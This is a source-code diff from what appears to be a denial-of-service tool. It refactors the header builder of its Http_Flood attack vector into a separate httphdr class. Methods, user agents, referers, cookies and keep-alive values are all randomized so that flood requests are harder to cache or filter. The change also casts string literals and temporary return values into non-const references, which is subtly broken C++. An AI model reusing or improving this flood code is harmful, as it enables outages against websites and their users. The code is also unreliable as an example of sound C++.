@@ -5,6 +5,7 @@
 #include <openssl/ssl.h>
 
 #include "../Headers/Http_Flood.hpp"
+#include "../Headers/httphdr.hpp"
 
 
 Http_Flood::Http_Flood(std::shared_ptr<Config> conf) : Attack_Vector(std::move(conf)){
@@ -219,22 +220,26 @@ void Http_Flood::init_header(std::string& header) {
             header += Randomizer::randomstr();
             break;
         case Config::HTTP:{
-            header += Randomizer::random_method() + " /";
+            auto http = std::make_unique<httphdr>();
+            http->setMethod(const_cast<std::string &>(Randomizer::random_method()));
             if(conf->RandomizeHeader){
-                header += Randomizer::randomstr();
+                http->setLocation(const_cast<std::string &>(Randomizer::randomstr()));
             }
-            header += " HTTP/1.0\r\nUser-Agent: "
-                      + Randomizer::random_useragent(*(conf->useragents))
-                      +" \r\nCache-Control: " + Randomizer::random_caching()
-                      + " \r\nAccept-Encoding: " + Randomizer::random_encoding()
-                      + " \r\nAccept-Charset: " + Randomizer::random_charset() + ", " + Randomizer::random_charset()
-                      + " \r\nReferer: " + Randomizer::random_referer()
-                      + " \r\nAccept: */*\r\nConnection: Keep-Alive"
-                      + " \r\nContent-Type: " + Randomizer::random_contenttype()
-                      + " \r\nCookie: " + Randomizer::randomstr() + "=" + Randomizer::randomstr()
-                      + " \r\nKeep-Alive: " + std::to_string(Randomizer::randomInt(1, 5000))
-                      + " \r\nDNT: " + std::to_string(Randomizer::randomInt(0, 1))
-                      + "\r\n\r\n";
+            http->setUseragent(const_cast<std::string &>(Randomizer::random_useragent(*(conf->useragents))));
+            http->setCacheControl(const_cast<std::string &>(Randomizer::random_caching()));
+            http->setEncoding(const_cast<std::string &>(Randomizer::random_encoding()));
+            http->setCharset(const_cast<std::string &>(Randomizer::random_charset()),
+                             const_cast<std::string &>(Randomizer::random_charset()));
+            http->setReferer(const_cast<std::string &>(Randomizer::random_referer()));
+            http->setAccept((std::string &) "*/*");
+            http->setConnectionType((std::string &) "Keep-Alive");
+            http->setContentType(const_cast<std::string &>(Randomizer::random_contenttype()));
+            http->setCookie(const_cast<std::string &>(Randomizer::randomstr()),
+                            const_cast<std::string &>(Randomizer::randomstr()));
+            http->setKeepAlive(Randomizer::randomInt(1, 5000));
+            http->setDNT(Randomizer::randomInt(0, 1));
+
+            header += http->get();
             break;
         }
         default:break;
